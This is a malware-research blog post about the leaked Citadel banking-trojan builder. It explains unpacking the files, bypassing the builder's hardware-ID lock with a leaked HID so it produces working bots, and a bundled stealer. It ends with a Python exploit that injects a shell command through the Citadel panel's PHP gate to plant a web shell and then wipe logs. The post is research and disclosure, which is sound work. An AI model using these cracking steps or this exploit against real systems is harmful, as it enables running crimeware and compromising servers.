---
title: "How the protection of Citadel got cracked"
date: Tue, 31 Dec 2013 13:28:00 +0000
draft: false
type: posts
categories: 
- [object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object]
---
# How the protection of Citadel got cracked

<br/>

<br/>
Recently on a forum someone requested cbcs.exe (Citadel Backconnect Server)  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyYb2AuY7UJRqX5XJ7vzyJ-unafw2IhZUx3TIBKqAaCqctzWCS22mggcaB_DLCssPWnhXIiuatBZq6gyiYVScMkS9krtoG0byang2YSSLtVFauWcgJ1y64l8B7RUCuY9fXYwXbCUoNbGg/s400/29-12-2013+17-51-47.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgyYb2AuY7UJRqX5XJ7vzyJ-unafw2IhZUx3TIBKqAaCqctzWCS22mggcaB_DLCssPWnhXIiuatBZq6gyiYVScMkS9krtoG0byang2YSSLtVFauWcgJ1y64l8B7RUCuY9fXYwXbCUoNbGg/s1600/29-12-2013+17-51-47.png)

If you want to read more about the Backconnect on Citadel, the link that g4m372 shared is cool: [http://laboratoriomalware.blogspot.de/2012/12/troyan-citadel-backconnect-windows.html](http://laboratoriomalware.blogspot.de/2012/12/troyan-citadel-backconnect-windows.html)  
  
I've searched this file thought downloading a random mirror of the Citadel leaked package in hope to find it inside.  

Finally the file wasn't on the leaked archive but was already grabbed by various malware trackers.  
MD5: [50A59E805EEB228D44F6C08E4B786D1E](http://vxvault.siri-urz.net/ViriList.php?MD5=50a59e805eeb228d44f6c08e4b786d1e)  
Malwarebytes: Backdoor.Citadel.BkCnct  
  
And since i've downloaded the leaked Citadel package... let's see about the Builder.  
It can be interesting to make a post about it.  
  
Citadel.exe: a33fb3c7884050642202e39cd7f177e0  
Malwarebytes: Hacktool.Citadel.Builder  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4SdNffd8_9lnaTUxWr6fllT0E65UtZ2HJMWtn-5ww1QTTGUqAqwd4t55QE2ZwHZphwIsvFoWSFwtvq_xrsk_biH3i8D81Z_ceeywEsK51W-xGz7pLzpKUJi3xRdbEJZHS68p0Rdz-SWg/s400/29-12-2013+18-08-59.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4SdNffd8_9lnaTUxWr6fllT0E65UtZ2HJMWtn-5ww1QTTGUqAqwd4t55QE2ZwHZphwIsvFoWSFwtvq_xrsk_biH3i8D81Z_ceeywEsK51W-xGz7pLzpKUJi3xRdbEJZHS68p0Rdz-SWg/s1600/29-12-2013+18-08-59.png)

"ERROR: Builder has been moved to another PC or virtual environment, now it is deactivated."  
  
This file is packed with UPX:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOxZwxHcO3GcmdaJ5YPLDJCbdNA8JiXYBTUd7c-aYcTrhoI9cY9n1_pBBJxBGvffI19eO4hgWcoAuCEA-yk0qZ_eCYfSIlQ2wWBckPORczowJMHdxCARPJGEDysn1257gH4u4Raucogac/s400/23-12-2013+00-56-02.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOxZwxHcO3GcmdaJ5YPLDJCbdNA8JiXYBTUd7c-aYcTrhoI9cY9n1_pBBJxBGvffI19eO4hgWcoAuCEA-yk0qZ_eCYfSIlQ2wWBckPORczowJMHdxCARPJGEDysn1257gH4u4Raucogac/s1600/23-12-2013+00-56-02.png)

  
Same for the Citadel Backconnect Server and the Hardware ID generator.  
But when we try to unpack it via UPX we have an exception:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_oD2f3-JpH2q9u1WsFogxTvWigrCDzGszVYZ7apckh9b-K6UlquAhwFrW0xBge3ExsGrbDsRuLAJzZKIogShNQCSU5KTV0XcFzps_HPeWmGW2vNPPPpcQtCBDHJZro_S1ppJb8tLPs3o/s400/29-12-2013+18-11-37.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_oD2f3-JpH2q9u1WsFogxTvWigrCDzGszVYZ7apckh9b-K6UlquAhwFrW0xBge3ExsGrbDsRuLAJzZKIogShNQCSU5KTV0XcFzps_HPeWmGW2vNPPPpcQtCBDHJZro_S1ppJb8tLPs3o/s1600/29-12-2013+18-11-37.png)

  
UPX told us that there is something wrong with the file header, aquabox used a lame trick.  
With an hexadecimal editor we can clearly see that there is a problem with the DOS Header:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjomAmmijYZlZYYxprcGwIdfx1SIEvR0wzNeeOZDUWo0-pJY8HWh31Xu7a_E1OcehXoC7SVBvSOz9B8DClhwAvVZbVN4mQGE2UWXfJh8H4UikElSG5i59OzO8Gf8EnMdn9-6MUEUIUR9r4/s400/29-12-2013+18-14-36.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjomAmmijYZlZYYxprcGwIdfx1SIEvR0wzNeeOZDUWo0-pJY8HWh31Xu7a_E1OcehXoC7SVBvSOz9B8DClhwAvVZbVN4mQGE2UWXfJh8H4UikElSG5i59OzO8Gf8EnMdn9-6MUEUIUR9r4/s1600/29-12-2013+18-14-36.png)

  
We have 0x4D 0x5A ... 00 ... and a size of 0xE8 for the memory.  
[e\_lfanew](http://pe101.corkami.com/) is null, so let's fix it at 18h by 0x40  
Miracle:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXJV0syMrng48Ei_M9BDH3rGbGA87Crz8M1Y1-gNkBWqzSK3XISQ_FlTXJzuGO_VbbMup5pY_hc0Bwke1dfHPBQ16HELw0Sc0YCChEv3NbptuPy4v0q3kpsaQEKy_7xGsa2uJJQ7oA6as/s400/29-12-2013+18-23-57.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgXJV0syMrng48Ei_M9BDH3rGbGA87Crz8M1Y1-gNkBWqzSK3XISQ_FlTXJzuGO_VbbMup5pY_hc0Bwke1dfHPBQ16HELw0Sc0YCChEv3NbptuPy4v0q3kpsaQEKy_7xGsa2uJJQ7oA6as/s1600/29-12-2013+18-23-57.png)

  
Same tricks for the Hardware ID Calculator and the Citadel Backconnect Server, i will get back on these two files later.  
Now that we have a clear code we can know the Time/Date Stamp, view the ressources, but more interesting: see how Citadel is protected  
  
Viewing the strings already give us a good insight:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg10TU-4uHcdzXNkwRIM6zGy_WB3aOchb1Wv0P1Bj-EwTVJ2H3E_jnZMUjyg4wIP-kdYVSb6ipJS_Tr_dQaFxb1JnJyZbONUKFmWnN1IkqRDRT2EmLpyhEWoMaO6sctAMKTWkqDhPxgaWQ/s400/29-12-2013+18-29-14.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg10TU-4uHcdzXNkwRIM6zGy_WB3aOchb1Wv0P1Bj-EwTVJ2H3E_jnZMUjyg4wIP-kdYVSb6ipJS_Tr_dQaFxb1JnJyZbONUKFmWnN1IkqRDRT2EmLpyhEWoMaO6sctAMKTWkqDhPxgaWQ/s1600/29-12-2013+18-29-14.png)

PHYSICALDRIVE0, Win32\_BIOS, Win32\_Processor, SerialNumber...  
  
But we don't even really need to waste time trying to know how the generation is made.  
Although you can put a breakpoint at the beginning of the calculation procedure (0x4013F2)  
At the end, you will be here, this routine will finalise your HID:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirU5rcuoDpaazLKZEeUMCgc2xssokCF98-g0VTFnTHxj3sAy4HuSJmYpYY7fccJD4qRwcZCRdrdNcNTCHvcQISOmGu08C-exmIUw7hl-v22CzszV0wn2j2IYKT3Qby4TO-ChOVyVTxvfE/s400/29-12-2013+18-43-16.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEirU5rcuoDpaazLKZEeUMCgc2xssokCF98-g0VTFnTHxj3sAy4HuSJmYpYY7fccJD4qRwcZCRdrdNcNTCHvcQISOmGu08C-exmIUw7hl-v22CzszV0wn2j2IYKT3Qby4TO-ChOVyVTxvfE/s1600/29-12-2013+18-43-16.png)

  
From another side, you can also have a look on the Hardware ID Calculator.  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLPOZ4EL_WixHubhswyuWqWmdX3ijJVx4OETwxqA5kDEy04ulEUnoKn0jueVvdAaC3gd2hGoslGrNvRFN4doYww_1OFkHfKejdxBDjOVBwDTgz4K1AQ5nqIoNQyYcODeHz9_fl4O-ZysM/s1600/29-12-2013+18-48-42.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgLPOZ4EL_WixHubhswyuWqWmdX3ijJVx4OETwxqA5kDEy04ulEUnoKn0jueVvdAaC3gd2hGoslGrNvRFN4doYww_1OFkHfKejdxBDjOVBwDTgz4K1AQ5nqIoNQyYcODeHz9_fl4O-ZysM/s1600/29-12-2013+18-48-42.png)

  
I've got a problem with this file, the first layer was a SFX archive:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhX0oWBI2HBDl1fYHGgKQpEBnn0EnqMiRg706uHLRiE5VGvgePZ8pCMuoi6ZyEB1Kg4JY2Nk0sh67xTOVKfROv-mmN7mgY7dTVnIgZ5NPlxKFJgoBR-J5lMZ64qRuq8I9BH0zlbd4CzjMM/s400/29-12-2013+19-02-08.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhX0oWBI2HBDl1fYHGgKQpEBnn0EnqMiRg706uHLRiE5VGvgePZ8pCMuoi6ZyEB1Kg4JY2Nk0sh67xTOVKfROv-mmN7mgY7dTVnIgZ5NPlxKFJgoBR-J5lMZ64qRuq8I9BH0zlbd4CzjMM/s1600/29-12-2013+19-02-08.png)

  
Malware embedded (stealer):  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiazy6RRxkMvCv9ptkg8D9A9uBUvbbChfFMuNlUkBy9jOU3H5Nr0wLDdp6dT-dACJQShXqEdKABmcWnKbvuEHrPOlqmmhZjbCw99z0ie7yN274RIvR6hZ-1kIPWf7Dt6Ol_XOhHkAR_Omc/s320/29-12-2013+19-04-07.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiazy6RRxkMvCv9ptkg8D9A9uBUvbbChfFMuNlUkBy9jOU3H5Nr0wLDdp6dT-dACJQShXqEdKABmcWnKbvuEHrPOlqmmhZjbCw99z0ie7yN274RIvR6hZ-1kIPWf7Dt6Ol_XOhHkAR_Omc/s1600/29-12-2013+19-04-07.png)

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVol9s-Q7feDxPIfZmHgsMOmMmYS-RKG5URh-XVPJjDeXJXOg4gaXlslGlINsqw3g_nw2PJAjj0Ns8Q3kT6Qf_ak3xhFRDFwSgptYzaO-2t0NDPFe0s0UIX0JiK5XOqSKAQeXNufXJ17g/s400/29-12-2013+19-06-57.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgVol9s-Q7feDxPIfZmHgsMOmMmYS-RKG5URh-XVPJjDeXJXOg4gaXlslGlINsqw3g_nw2PJAjj0Ns8Q3kT6Qf_ak3xhFRDFwSgptYzaO-2t0NDPFe0s0UIX0JiK5XOqSKAQeXNufXJ17g/s1600/29-12-2013+19-06-57.png)

  
Conclusion: Don't rush on leaked stuff.  
  
Alright, now that you have extracted/unpacked the good HID Calculator you can open it in olly.  
The code is exactly the same as the one you can find on the Citadel Builder, it may help to locate the calculation procedure on the builder although it's really easy to locate it.  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKLq5wDgygxNmRaRAQxVXpXs7CLgx4GFqidjf75PrqHSHNsS9piij5okXt-9P-nCeq_1umb1OYt_JJz2lxTllQaq8g2eKKcPc_xyE4k0TeaO6XhHoeZYmjdl_xWPn3Gg4nbXMKWURf5BQ/s400/29-12-2013+19-14-56.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjKLq5wDgygxNmRaRAQxVXpXs7CLgx4GFqidjf75PrqHSHNsS9piij5okXt-9P-nCeq_1umb1OYt_JJz2lxTllQaq8g2eKKcPc_xyE4k0TeaO6XhHoeZYmjdl_xWPn3Gg4nbXMKWURf5BQ/s1600/29-12-2013+19-14-56.png)

  
That was just a short parentheses, to get back on the builder, after that the generation end you will have multiple occasions to view your HID on the stack like here:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPEZ8zRDcX1Kt-U-JsYXiek8KJxks8pco03dAoI1nOPtXzD7S_DaslF03xAyrf7PgA9DCqLIN9W5qxpTPt30FVlsV3L-ZK2_6BFfR9Pm-POQmo5Uqjl8bkDp9obu4jYlaDkBKJJG3_fEM/s400/29-12-2013+19-24-34.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPEZ8zRDcX1Kt-U-JsYXiek8KJxks8pco03dAoI1nOPtXzD7S_DaslF03xAyrf7PgA9DCqLIN9W5qxpTPt30FVlsV3L-ZK2_6BFfR9Pm-POQmo5Uqjl8bkDp9obu4jYlaDkBKJJG3_fEM/s1600/29-12-2013+19-24-34.png)

And the crutial part start here.  
  
When the Citadel package of Citab got leaked ([see this article for more information](http://www.xylibox.com/2013/06/citadel-lawsuit-and-explanation-of-john.html)) an important file was also released:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBBzZyFLEOrjIBjMq25oknUevjMYYcG9r-3nc4sUOip-qztA8Ku4tFx3VPrn-0T6fY2PQSQaESAGpPX4bJISyOyBzfDN93McGJgZegY2WmhzUEvE1MRpwlk0DBTqgqcgcWZdcQe7jECsw/s1600/29-12-2013+19-32-23.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBBzZyFLEOrjIBjMq25oknUevjMYYcG9r-3nc4sUOip-qztA8Ku4tFx3VPrn-0T6fY2PQSQaESAGpPX4bJISyOyBzfDN93McGJgZegY2WmhzUEvE1MRpwlk0DBTqgqcgcWZdcQe7jECsw/s1600/29-12-2013+19-32-23.png)

  
The HID of the original machine who was running the builder, so you just have to replace your HID by this one, just like this:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguJbG6EI788om3XsthnSs_VYt6UWgjSWCemTbQEZbvACufBM7LRvukR4OyRAWA7YV6VTW3khaH58m4DsvoiGB_qaQ91AjG-8vK6WI9zmgcQqjci8IN659HqJbb5c_gaH5uiAVd7laU2M0/s400/29-12-2013+19-36-14.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEguJbG6EI788om3XsthnSs_VYt6UWgjSWCemTbQEZbvACufBM7LRvukR4OyRAWA7YV6VTW3khaH58m4DsvoiGB_qaQ91AjG-8vK6WI9zmgcQqjci8IN659HqJbb5c_gaH5uiAVd7laU2M0/s1600/29-12-2013+19-36-14.png)

  
And this is how the protection of Citadel become super weak and can generate working malwares  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzhqfUqBcjcri3Rfn-d14KhEBTXDxEmVJJgr9MJeozuiH8drPhWylBcmUo4On9Tgp77JmmLA77UUSvPWzeS7MUGIUajEceHOPVpJ6oKKuBLs_Mdt2Nc5BhxX-7PiomlB8rPVTzETodNLA/s400/29-12-2013+19-38-04.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzhqfUqBcjcri3Rfn-d14KhEBTXDxEmVJJgr9MJeozuiH8drPhWylBcmUo4On9Tgp77JmmLA77UUSvPWzeS7MUGIUajEceHOPVpJ6oKKuBLs_Mdt2Nc5BhxX-7PiomlB8rPVTzETodNLA/s1600/29-12-2013+19-38-04.png)

Now you just have to do a codecave or inject a dll in order to modify it permanently, child game.  
  
The problem that every crackers was facing on leaked Citadel builders is to find the good HID key.  
Citadel builders who was previously leaked wasn't leaked with HID key.  
e.g: vortex1772\_second - 1.3.5.1  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_aTk7VW_-2JNZxtGzACl_FuvgiQ9_iMw7TZoQwlAlrPzmRU0kgezJ9tNr4ZMcnKbLMNwzVLEU6YoxxvqBdnCaElPN2SlheUHsn-sw7dWbf3q3d8j0zmd0MJV9wEG8OmX_xb8K-k3EBlg/s400/dK6XvLF.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg_aTk7VW_-2JNZxtGzACl_FuvgiQ9_iMw7TZoQwlAlrPzmRU0kgezJ9tNr4ZMcnKbLMNwzVLEU6YoxxvqBdnCaElPN2SlheUHsn-sw7dWbf3q3d8j0zmd0MJV9wEG8OmX_xb8K-k3EBlg/s1600/dK6XvLF.png)

  
And you can't just 'force' the procedure to generate a bot because the Citadel stub is encrypted inside, that why when the package got leaked with the correct HID, a easy way to crack the builder appeared.  
Without having the good HID you can still bruteforce it till you break the key but this is much harder and time wasting, this solution would be also a more great achievement and respected in scene release.  
  
To finish, let's get back on the Citadel backconnect server who was requested on kernelmode.info  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhONOanrUhlqlSgTY3BUyk4BZso9xDagiCQ85eJOokRJVfuvzyzxeCg5cDqa3IH8qRand4hZ6B7NM1AZ0GRheResFu79KRKshm-Yic0X_Ye5A_byUozRk56QO9O6k8YleNBrUaSelhZKag/s400/30-12-2013+01-47-30.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhONOanrUhlqlSgTY3BUyk4BZso9xDagiCQ85eJOokRJVfuvzyzxeCg5cDqa3IH8qRand4hZ6B7NM1AZ0GRheResFu79KRKshm-Yic0X_Ye5A_byUozRk56QO9O6k8YleNBrUaSelhZKag/s1600/30-12-2013+01-47-30.png)

  
This script was also leaked with the Citab package:  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpcNtqT7SzYEKYsFT_Ph9qbsQRcW3Kfr4tH1roAXped2UNkkOgZ65BXN3mxhDJlzfsKC-ZytXpq5OgoLYn2go21iTFmi_u3rb_pElq-GGG4ciJ8eRcMzMyiTgVVHykAP3fyVmO-hiOeJE/s400/30-12-2013+01-49-29.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhpcNtqT7SzYEKYsFT_Ph9qbsQRcW3Kfr4tH1roAXped2UNkkOgZ65BXN3mxhDJlzfsKC-ZytXpq5OgoLYn2go21iTFmi_u3rb_pElq-GGG4ciJ8eRcMzMyiTgVVHykAP3fyVmO-hiOeJE/s1600/30-12-2013+01-49-29.png)

  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7VtNgg_1cQaqaTyHKRMDUgzIq1-gEN38iHJEsYn4F68FkCMD5AAOcPNcSCwT3Qyfj3zFJhAQH1wKowbbKuiMsVoDGDsMvhJlKHh_FVwELJg2LNIgcTTXUqixZLqn5vcZ1oGft5dGQ9Ns/s1600/31-12-2013+14-08-54.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi7VtNgg_1cQaqaTyHKRMDUgzIq1-gEN38iHJEsYn4F68FkCMD5AAOcPNcSCwT3Qyfj3zFJhAQH1wKowbbKuiMsVoDGDsMvhJlKHh_FVwELJg2LNIgcTTXUqixZLqn5vcZ1oGft5dGQ9Ns/s1600/31-12-2013+14-08-54.jpg)

  
It's for Windows box, and it's super secure... oh wait..  

import urllib  
import urllib2  
  
def request(url, params=None, method='GET'):  
    if method == 'POST':  
        urllib2.urlopen(url, urllib.urlencode(params)).read()  
    elif method == 'GET':  
        if params == None:  
            urllib2.urlopen(url)  
        else:  
            urllib2.urlopen(url + '?' + urllib.urlencode(params)).read()  
  
def uploadShell(url, filename, payload):  
    data = {  
        'b'  : 'tapz',  
        'p1' : 'faggot',  
        'p2' : 'hacker | echo "' + payload + '" >> ' + filename  
    }  
    request(url + 'test.php', data)  
  
def shellExists(url):  
    return urllib.urlopen(url).getcode() == 200  
     
def cleanLogs(url):  
    delete = {  
        'delete' : ''  
    }  
    request(URL + 'control.php', delete, 'POST')  
  
URL      = 'http://localhost/citadel/winserv\_php\_gate/'  
FILENAME = 'shell.php'  
PAYLOAD  = '<?php phpinfo(); ?>'  
  
uploadShell(URL, FILENAME, PAYLOAD)  
print '\[~\] Shell created!'  
if not shellExists(URL + FILENAME):  
    print '\[-\]', FILENAME, 'not found...'  
else:  
    print '\[+\] Go to:', URL + FILENAME  
cleanLogs(URL)  
print '\[~\] Logs cleaned!'

  
Brief, happy new year guys :)  
  
  
  

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4SnfOeR5GJCK-Bio042L1N_UC1DUlvfzi7pgPD5FqIO_WaKIFSivendBhNvQmWgrwK9pXDVvZmadu4fKiGQd4O7t31Ieu4GoG9whSAmS_NPt2PhX78Rz_tZCsdWji4wiK8FUl7PSEjK0/s400/design_temari_by_e_nat-d3cmyj3.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4SnfOeR5GJCK-Bio042L1N_UC1DUlvfzi7pgPD5FqIO_WaKIFSivendBhNvQmWgrwK9pXDVvZmadu4fKiGQd4O7t31Ieu4GoG9whSAmS_NPt2PhX78Rz_tZCsdWji4wiK8FUl7PSEjK0/s1600/design_temari_by_e_nat-d3cmyj3.jpg)

#### [Source](https://www.xylibox.com/2013/12/how-protection-of-citadel-got-cracked.html)

<br/>
---
